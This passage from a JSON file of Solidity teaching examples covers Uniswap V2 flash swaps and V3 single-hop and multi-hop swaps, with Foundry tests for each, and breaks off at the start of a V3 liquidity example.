        "fileName": "UniswapV2FlashSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IUniswapV2Callee {\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ncontract UniswapV2FlashSwap is IUniswapV2Callee {\n    address private constant UNISWAP_V2_FACTORY =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    IUniswapV2Factory private constant factory =\n        IUniswapV2Factory(UNISWAP_V2_FACTORY);\n\n    IERC20 private constant weth = IERC20(WETH);\n\n    IUniswapV2Pair private immutable pair;\n\n    // For this example, store the amount to repay\n    uint256 public amountToRepay;\n\n    constructor() {\n        pair = IUniswapV2Pair(factory.getPair(DAI, WETH));\n    }\n\n    function flashSwap(uint256 wethAmount) external {\n        // Need to pass some data to trigger uniswapV2Call\n        bytes memory data = abi.encode(WETH, msg.sender);\n\n        // amount0Out is DAI, amount1Out is WETH\n        pair.swap(0, wethAmount, address(this), data);\n    }\n\n    // This function is called by the DAI/WETH pair contract\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external {\n        require(msg.sender == address(pair), \"not pair\");\n        require(sender == address(this), \"not sender\");\n\n        (address tokenBorrow, address caller) =\n            abi.decode(data, (address, address));\n\n        // Your custom code would go here. For example, code to arbitrage.\n        require(tokenBorrow == WETH, \"token borrow != WETH\");\n\n        // about 0.3% fee, +1 to round up\n        uint256 fee = (amount1 * 3) / 997 + 1;\n        amountToRepay = amount1 + fee;\n\n        // Transfer flash swap fee from caller\n        weth.transferFrom(caller, address(this), fee);\n\n        // Repay\n        weth.transfer(address(pair), amountToRepay);\n    }\n}\n\ninterface IUniswapV2Pair {\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV2FlashSwapTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v2-flash-swap/UniswapV2FlashSwap.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract UniswapV2FlashSwapTest is Test {\n    IWETH private weth = IWETH(WETH);\n\n    UniswapV2FlashSwap private uni = new UniswapV2FlashSwap();\n\n    function setUp() public {}\n\n    function testFlashSwap() public {\n        weth.deposit{value: 1e18}();\n        // Approve flash swap fee\n        weth.approve(address(uni), 1e18);\n\n        uint256 amountToBorrow = 10 * 1e18;\n        uni.flashSwap(amountToBorrow);\n\n        assertGt(uni.amountToRepay(), amountToBorrow);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v2",
      "flash",
      "swap",
      "amm"
    ],
    "order": 3
  },
  {
    "slug": "uniswap-v3-swap",
    "title": "Uniswap V3 Swap Examples",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V3 swap examples",
    "content": "### Uniswap V3 Single Hop Swap\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n\ncontract UniswapV3SingleHopSwap {\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    function swapExactInputSingleHop(uint256 amountIn, uint256 amountOutMin)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        ISwapRouter02.ExactInputSingleParams memory params = ISwapRouter02\n            .ExactInputSingleParams({\n            tokenIn: WETH,\n            tokenOut: DAI,\n            fee: 3000,\n            recipient: msg.sender,\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin,\n            sqrtPriceLimitX96: 0\n        });\n\n        router.exactInputSingle(params);\n    }\n\n    function swapExactOutputSingleHop(uint256 amountOut, uint256 amountInMax)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        ISwapRouter02.ExactOutputSingleParams memory params = ISwapRouter02\n            .ExactOutputSingleParams({\n            tokenIn: WETH,\n            tokenOut: DAI,\n            fee: 3000,\n            recipient: msg.sender,\n            amountOut: amountOut,\n            amountInMaximum: amountInMax,\n            sqrtPriceLimitX96: 0\n        });\n\n        uint256 amountIn = router.exactOutputSingle(params);\n\n        if (amountIn < amountInMax) {\n            weth.approve(address(router), 0);\n            weth.transfer(msg.sender, amountInMax - amountIn);\n        }\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n\n    struct ExactOutputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactOutputSingle(ExactOutputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountIn);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Uniswap V3 Multi Hop Swap\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n\ncontract UniswapV3MultiHopSwap {\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    function swapExactInputMultiHop(uint256 amountIn, uint256 amountOutMin)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        bytes memory path =\n            abi.encodePacked(WETH, uint24(3000), USDC, uint24(100), DAI);\n\n        ISwapRouter02.ExactInputParams memory params = ISwapRouter02\n            .ExactInputParams({\n            path: path,\n            recipient: msg.sender,\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin\n        });\n\n        router.exactInput(params);\n    }\n\n    function swapExactOutputMultiHop(uint256 amountOut, uint256 amountInMax)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        bytes memory path =\n            abi.encodePacked(DAI, uint24(100), USDC, uint24(3000), WETH);\n\n        ISwapRouter02.ExactOutputParams memory params = ISwapRouter02\n            .ExactOutputParams({\n            path: path,\n            recipient: msg.sender,\n            amountOut: amountOut,\n            amountInMaximum: amountInMax\n        });\n\n        uint256 amountIn = router.exactOutput(params);\n\n        if (amountIn < amountInMax) {\n            weth.approve(address(router), 0);\n            weth.transfer(msg.sender, amountInMax - amountIn);\n        }\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputParams {\n        bytes path;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n    }\n\n    function exactInput(ExactInputParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n\n    struct ExactOutputParams {\n        bytes path;\n        address recipient;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n    }\n\n    function exactOutput(ExactOutputParams calldata params)\n        external\n        payable\n        returns (uint256 amountIn);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Test with Foundry\n\nSingle hop test\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-swap/UniswapV3SingleHopSwap.sol\";\n\ncontract UniswapV3SingleHopSwapTest is Test {\n    address private constant SWAP_ROUTER_02 =\n        0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant DAI_WETH_POOL_3000 =\n        0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\n\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    UniswapV3SingleHopSwap private swap;\n\n    uint256 private constant AMOUNT_IN = 1e18;\n    uint256 private constant AMOUNT_OUT = 50 * 1e18;\n    uint256 private constant MAX_AMOUNT_IN = 1e18;\n\n    function setUp() public {\n        swap = new UniswapV3SingleHopSwap();\n        weth.deposit{value: AMOUNT_IN + MAX_AMOUNT_IN}();\n        weth.approve(address(swap), type(uint256).max);\n    }\n\n    function test_swapExactInputSingleHop() public {\n        swap.swapExactInputSingleHop(AMOUNT_IN, 1);\n        uint256 d1 = dai.balanceOf(address(this));\n        assertGt(d1, 0, \"DAI balance = 0\");\n    }\n\n    function test_swapExactOutputSingleHop() public {\n        uint256 w0 = weth.balanceOf(address(this));\n        uint256 d0 = dai.balanceOf(address(this));\n        swap.swapExactOutputSingleHop(AMOUNT_OUT, MAX_AMOUNT_IN);\n        uint256 w1 = weth.balanceOf(address(this));\n        uint256 d1 = dai.balanceOf(address(this));\n\n        assertLt(w1, w0, \"WETH balance didn't decrease\");\n        assertGt(d1, d0, \"DAI balance didn't increase\");\n        assertEq(weth.balanceOf(address(swap)), 0, \"WETH balance of swap != 0\");\n        assertEq(dai.balanceOf(address(swap)), 0, \"DAI balance of swap != 0\");\n    }\n}\n\n```\n\nMulti hop test\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-swap/UniswapV3MultiHopSwap.sol\";\n\ncontract UniswapV3MultiHopSwapTest is Test {\n    address private constant SWAP_ROUTER_02 =\n        0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n    IERC20 private constant usdc = IERC20(USDC);\n\n    UniswapV3MultiHopSwap private swap;\n\n    uint256 private constant AMOUNT_IN = 10 * 1e18;\n    uint256 private constant AMOUNT_OUT = 20 * 1e18;\n    uint256 private constant MAX_AMOUNT_IN = 1e18;\n\n    function setUp() public {\n        swap = new UniswapV3MultiHopSwap();\n        weth.deposit{value: AMOUNT_IN + MAX_AMOUNT_IN}();\n        weth.approve(address(swap), type(uint256).max);\n    }\n\n    function test_swapExactInputMultiHop() public {\n        swap.swapExactInputMultiHop(AMOUNT_IN, 1);\n        uint256 d1 = dai.balanceOf(address(this));\n        assertGt(d1, 0, \"DAI balance = 0\");\n    }\n\n    function test_swapExactOutputMultiHop() public {\n        uint256 w0 = weth.balanceOf(address(this));\n        uint256 d0 = dai.balanceOf(address(this));\n        swap.swapExactOutputMultiHop(AMOUNT_OUT, MAX_AMOUNT_IN);\n        uint256 w1 = weth.balanceOf(address(this));\n        uint256 d1 = dai.balanceOf(address(this));\n\n        assertLt(w1, w0, \"WETH balance didn't decrease\");\n        assertGt(d1, d0, \"DAI balance didn't increase\");\n        assertEq(weth.balanceOf(address(swap)), 0, \"WETH balance of swap != 0\");\n        assertEq(dai.balanceOf(address(swap)), 0, \"DAI balance of swap != 0\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV3MultiHopSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n\ncontract UniswapV3MultiHopSwap {\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    function swapExactInputMultiHop(uint256 amountIn, uint256 amountOutMin)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        bytes memory path =\n            abi.encodePacked(WETH, uint24(3000), USDC, uint24(100), DAI);\n\n        ISwapRouter02.ExactInputParams memory params = ISwapRouter02\n            .ExactInputParams({\n            path: path,\n            recipient: msg.sender,\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin\n        });\n\n        router.exactInput(params);\n    }\n\n    function swapExactOutputMultiHop(uint256 amountOut, uint256 amountInMax)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        bytes memory path =\n            abi.encodePacked(DAI, uint24(100), USDC, uint24(3000), WETH);\n\n        ISwapRouter02.ExactOutputParams memory params = ISwapRouter02\n            .ExactOutputParams({\n            path: path,\n            recipient: msg.sender,\n            amountOut: amountOut,\n            amountInMaximum: amountInMax\n        });\n\n        uint256 amountIn = router.exactOutput(params);\n\n        if (amountIn < amountInMax) {\n            weth.approve(address(router), 0);\n            weth.transfer(msg.sender, amountInMax - amountIn);\n        }\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputParams {\n        bytes path;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n    }\n\n    function exactInput(ExactInputParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n\n    struct ExactOutputParams {\n        bytes path;\n        address recipient;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n    }\n\n    function exactOutput(ExactOutputParams calldata params)\n        external\n        payable\n        returns (uint256 amountIn);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV3MultiHopSwapTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-swap/UniswapV3MultiHopSwap.sol\";\n\ncontract UniswapV3MultiHopSwapTest is Test {\n    address private constant SWAP_ROUTER_02 =\n        0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n    IERC20 private constant usdc = IERC20(USDC);\n\n    UniswapV3MultiHopSwap private swap;\n\n    uint256 private constant AMOUNT_IN = 10 * 1e18;\n    uint256 private constant AMOUNT_OUT = 20 * 1e18;\n    uint256 private constant MAX_AMOUNT_IN = 1e18;\n\n    function setUp() public {\n        swap = new UniswapV3MultiHopSwap();\n        weth.deposit{value: AMOUNT_IN + MAX_AMOUNT_IN}();\n        weth.approve(address(swap), type(uint256).max);\n    }\n\n    function test_swapExactInputMultiHop() public {\n        swap.swapExactInputMultiHop(AMOUNT_IN, 1);\n        uint256 d1 = dai.balanceOf(address(this));\n        assertGt(d1, 0, \"DAI balance = 0\");\n    }\n\n    function test_swapExactOutputMultiHop() public {\n        uint256 w0 = weth.balanceOf(address(this));\n        uint256 d0 = dai.balanceOf(address(this));\n        swap.swapExactOutputMultiHop(AMOUNT_OUT, MAX_AMOUNT_IN);\n        uint256 w1 = weth.balanceOf(address(this));\n        uint256 d1 = dai.balanceOf(address(this));\n\n        assertLt(w1, w0, \"WETH balance didn't decrease\");\n        assertGt(d1, d0, \"DAI balance didn't increase\");\n        assertEq(weth.balanceOf(address(swap)), 0, \"WETH balance of swap != 0\");\n        assertEq(dai.balanceOf(address(swap)), 0, \"DAI balance of swap != 0\");\n    }\n}\n"
      },
      {
        "fileName": "UniswapV3SingleHopSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n\ncontract UniswapV3SingleHopSwap {\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IERC20 private constant weth = IERC20(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    function swapExactInputSingleHop(uint256 amountIn, uint256 amountOutMin)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        ISwapRouter02.ExactInputSingleParams memory params = ISwapRouter02\n            .ExactInputSingleParams({\n            tokenIn: WETH,\n            tokenOut: DAI,\n            fee: 3000,\n            recipient: msg.sender,\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin,\n            sqrtPriceLimitX96: 0\n        });\n\n        router.exactInputSingle(params);\n    }\n\n    function swapExactOutputSingleHop(uint256 amountOut, uint256 amountInMax)\n        external\n    {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        ISwapRouter02.ExactOutputSingleParams memory params = ISwapRouter02\n            .ExactOutputSingleParams({\n            tokenIn: WETH,\n            tokenOut: DAI,\n            fee: 3000,\n            recipient: msg.sender,\n            amountOut: amountOut,\n            amountInMaximum: amountInMax,\n            sqrtPriceLimitX96: 0\n        });\n\n        uint256 amountIn = router.exactOutputSingle(params);\n\n        if (amountIn < amountInMax) {\n            weth.approve(address(router), 0);\n            weth.transfer(msg.sender, amountInMax - amountIn);\n        }\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n\n    struct ExactOutputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountOut;\n        uint256 amountInMaximum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactOutputSingle(ExactOutputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountIn);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV3SingleHopSwapTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-swap/UniswapV3SingleHopSwap.sol\";\n\ncontract UniswapV3SingleHopSwapTest is Test {\n    address private constant SWAP_ROUTER_02 =\n        0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant DAI_WETH_POOL_3000 =\n        0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\n\n    IWETH private constant weth = IWETH(WETH);\n    IERC20 private constant dai = IERC20(DAI);\n\n    UniswapV3SingleHopSwap private swap;\n\n    uint256 private constant AMOUNT_IN = 1e18;\n    uint256 private constant AMOUNT_OUT = 50 * 1e18;\n    uint256 private constant MAX_AMOUNT_IN = 1e18;\n\n    function setUp() public {\n        swap = new UniswapV3SingleHopSwap();\n        weth.deposit{value: AMOUNT_IN + MAX_AMOUNT_IN}();\n        weth.approve(address(swap), type(uint256).max);\n    }\n\n    function test_swapExactInputSingleHop() public {\n        swap.swapExactInputSingleHop(AMOUNT_IN, 1);\n        uint256 d1 = dai.balanceOf(address(this));\n        assertGt(d1, 0, \"DAI balance = 0\");\n    }\n\n    function test_swapExactOutputSingleHop() public {\n        uint256 w0 = weth.balanceOf(address(this));\n        uint256 d0 = dai.balanceOf(address(this));\n        swap.swapExactOutputSingleHop(AMOUNT_OUT, MAX_AMOUNT_IN);\n        uint256 w1 = weth.balanceOf(address(this));\n        uint256 d1 = dai.balanceOf(address(this));\n\n        assertLt(w1, w0, \"WETH balance didn't decrease\");\n        assertGt(d1, d0, \"DAI balance didn't increase\");\n        assertEq(weth.balanceOf(address(swap)), 0, \"WETH balance of swap != 0\");\n        assertEq(dai.balanceOf(address(swap)), 0, \"DAI balance of swap != 0\");\n    }\n}\n"
      },
      {
        "fileName": "UniswapV3SwapExamples.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV3SwapExamples {\n    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n\n    function swapExactInputSingleHop(address tokenIn, address tokenOut, uint24 poolFee, uint256 amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);\n        IERC20(tokenIn).approve(address(router), amountIn);\n\n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({\n            tokenIn: tokenIn,\n            tokenOut: tokenOut,\n            fee: poolFee,\n            recipient: msg.sender,\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n\n        amountOut = router.exactInputSingle(params);\n    }\n\n    function swapExactInputMultiHop(bytes calldata path, address tokenIn, uint256 amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);\n        IERC20(tokenIn).approve(address(router), amountIn);\n\n        ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({\n            path: path,\n            recipient: msg.sender,\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0\n        });\n        amountOut = router.exactInput(params);\n    }\n}\n\ninterface ISwapRouter {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    /// @notice Swaps amountIn of one token for as much as possible of another token\n    /// @param params The parameters necessary for the swap, encoded as ExactInputSingleParams in calldata\n    /// @return amountOut The amount of the received token\n    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);\n\n    struct ExactInputParams {\n        bytes path;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n    }\n\n    /// @notice Swaps amountIn of one token for as much as possible of another along the specified path\n    /// @param params The parameters necessary for the multi-hop swap, encoded as ExactInputParams in calldata\n    /// @return amountOut The amount of the received token\n    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV3SwapExamplesTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/uniswap-v3-swap/UniswapV3SwapExamples.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract UniV3SwapTest is Test {\n    IWETH private weth = IWETH(WETH);\n    IERC20 private dai = IERC20(DAI);\n    IERC20 private usdc = IERC20(USDC);\n\n    UniswapV3SwapExamples private uni = new UniswapV3SwapExamples();\n\n    function setUp() public {}\n\n    function testSingleHop() public {\n        weth.deposit{value: 1e18}();\n        weth.approve(address(uni), 1e18);\n\n        uint256 amountOut = uni.swapExactInputSingleHop(WETH, DAI, 3000, 1e18);\n\n        console2.log(\"DAI\", amountOut);\n    }\n\n    function testMultiHop() public {\n        weth.deposit{value: 1e18}();\n        weth.approve(address(uni), 1e18);\n\n        bytes memory path = abi.encodePacked(WETH, uint24(3000), USDC, uint24(100), DAI);\n\n        uint256 amountOut = uni.swapExactInputMultiHop(path, WETH, 1e18);\n\n        console2.log(\"DAI\", amountOut);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v3",
      "swap",
      "amm"
    ],
    "order": 4
  },
  {
    "slug": "uniswap-v3-liquidity",
    "title": "Uniswap V3 Liquidity Examples",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V3 liquidity examples",
    "content": "Examples of minting new position, collecting fees, increasing and decreasing liquidity.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract UniswapV3Liquidity is IERC721Receiver {\n    IERC20 private constant dai = IERC20(DAI);\n    IWETH private constant weth = IWETH(WETH);\n\n    int24 private constant MIN_TICK = -887272;\n    int24 private constant MAX_TICK = -MIN_TICK;\n    int24 private constant TICK_SPACING = 60;\n\n    INonfungiblePositionManager public nonfungiblePositionManager =\n        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);\n\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata\n    ) external returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n\n    function mintNewPosition(uint256 amount0ToAdd, uint256 amount1ToAdd)\n        external\n        returns (\n            uint256 